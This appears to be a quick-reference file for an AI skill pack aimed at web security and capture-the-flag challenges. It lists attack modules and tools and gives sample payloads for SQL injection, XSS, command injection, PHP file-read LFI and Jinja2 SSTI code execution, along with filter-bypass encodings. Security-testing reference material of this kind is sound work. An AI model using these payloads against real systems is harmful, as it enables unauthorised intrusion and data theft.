# Web Security Skill - Quick Reference

## Directory Structure
```
web-security/
├── SKILL.md              # Core skill definition & dispatch rules
├── modules/
│   ├── recon.md          # Reconnaissance
│   ├── vuln-scan.md      # httpx + nuclei scanning
│   ├── sqli.md           # SQL injection
│   ├── xss.md            # XSS attacks
│   ├── rce.md            # Command execution
│   ├── lfi.md            # File inclusion (LFI/RFI)
│   ├── upload.md         # File upload
│   ├── ssrf.md           # SSRF attacks
│   ├── ssti.md           # SSTI attacks
│   ├── xxe.md            # XXE attacks
│   ├── deserialize.md    # Deserialization (PHP/Java/Python)
│   ├── php.md            # PHP quirks
│   ├── jwt.md            # JWT attacks
│   ├── java.md           # Java code audit
│   ├── blockchain.md     # Blockchain security
│   ├── cve.md            # Known CVE exploitation
│   ├── idor.md           # IDOR attacks
│   ├── auth-bypass.md    # Authentication bypass
│   ├── access-control.md # Access control testing
│   ├── business-logic.md # Business logic & DoS
│   └── request-forgery.md# CSRF / HRS / CRLF
└── docs/
    ├── QUICKREF.md        # This file
    └── TOOLS.md           # Tool installation guide
```

## Supported Challenge Types

| Type | Coverage | Key Tools |
|------|----------|-----------|
| SQL Injection | Union/Error/Blind/Stacked | sqlmap |
| XSS | Reflected/Stored/DOM | XSStrike |
| Command Execution | OS command/Code exec | commix |
| File Inclusion | LFI/RFI/PHP protocols | php://filter |
| File Upload | Bypass/Parse vulns | manual |
| SSRF | Protocol/Internal network | Gopherus |
| SSTI | Jinja2/Twig/Freemarker/7+ engines | tplmap |
| XXE | In-band/Blind/OOB | manual |
| Deserialization | PHP/Java/Python | ysoserial, phpggc |
| PHP Quirks | Weak typing/Variable overwrite | manual |
| JWT | None/Weak key/Algorithm confusion | jwt_tool |
| Java Audit | Spring/Struts/Shiro/Fastjson/Log4j | code audit |
| IDOR | ID fuzzing/GraphQL/UUID | ffuf |
| Auth Bypass | OTP/Default creds/OAuth/Race | manual |
| Business Logic | Price tampering/Race/ReDoS | manual |
| CSRF/HRS | Request smuggling/CRLF | manual |
| Blockchain | Smart contract vulns | Foundry |
| Known CVE | Middleware/CMS CVEs | nuclei |

## Quick Payload Reference

```sql
-- SQLi
' OR 1=1--
' UNION SELECT 1,2,3--
' AND extractvalue(1,concat(0x7e,(SELECT database())))--
```

```html
<!-- XSS -->
<script>alert(1)</script>
<img src=x onerror=alert(1)>
<svg onload=alert(1)>
```

```bash
# RCE
; id
| id
$(id)
```

```
# LFI
php://filter/read=convert.base64-encode/resource=index.php
```

```
# SSTI
{{7*7}}
{{config.__class__.__init__.__globals__['os'].popen('id').read()}}
```

## Common Bypass Techniques

```yaml
Encoding:
  - URL: %27 -> '
  - Double: %2527 -> %27 -> '
  - Unicode: \u0027 -> '

Case: SeLeCt, UnIoN

Whitespace: /**/, %09, %0a, ${IFS}

Keyword: selselectect, sel'+'ect
```
